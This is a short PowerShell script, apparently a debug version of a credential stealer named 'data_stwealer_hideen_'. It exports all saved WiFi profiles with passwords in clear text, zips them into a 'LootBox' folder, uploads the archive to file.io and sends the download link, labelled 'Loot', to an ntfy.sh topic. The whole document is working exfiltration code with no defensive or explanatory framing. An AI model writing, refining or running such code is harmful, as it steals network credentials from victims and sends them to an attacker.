$topic = "data_stwealer_hideen_"

Write-Host "=== DEBUG START ===" -ForegroundColor Cyan

# 1. Setup folders
$dir = "$env:TEMP\LootBox"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
mkdir $dir | Out-Null
$zip = "$env:TEMP\package.zip"
if (Test-Path $zip) { Remove-Item -Force $zip }

# 2. Try to grab WiFi
Write-Host "[*] Exporting WiFi Profiles..."
netsh wlan export profile folder=$dir key=clear | Out-Null

# 3. Zip it
Write-Host "[*] Zipping files..."
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

# 4. Check if ZIP exists and has data
if (Test-Path $zip) {
    $size = (Get-Item $zip).Length
    Write-Host "[+] ZIP Created ($size bytes)" -ForegroundColor Green
    
    # 5. Upload to file.io
    Write-Host "[*] Uploading to file.io..."
    $response = curl.exe -s -F "file=@$zip" https://file.io
    
    if ($response -match '"link":"([^"]+)"') {
        $link = $matches[1]
        Write-Host "[!] SUCCESS! Link: $link" -ForegroundColor Green
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
    } else {
        Write-Host "[-] Upload failed. Response: $response" -ForegroundColor Red
    }
} else {
    Write-Host "[-] Error: ZIP was never created." -ForegroundColor Red
}

# 6. NEVER EXIT
Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
Write-Host "The window is staying open for you to read." -ForegroundColor Yellow
Read-Host "Press Enter to clean up files and exit"

Remove-Item -Recurse -Force $dir, $zip
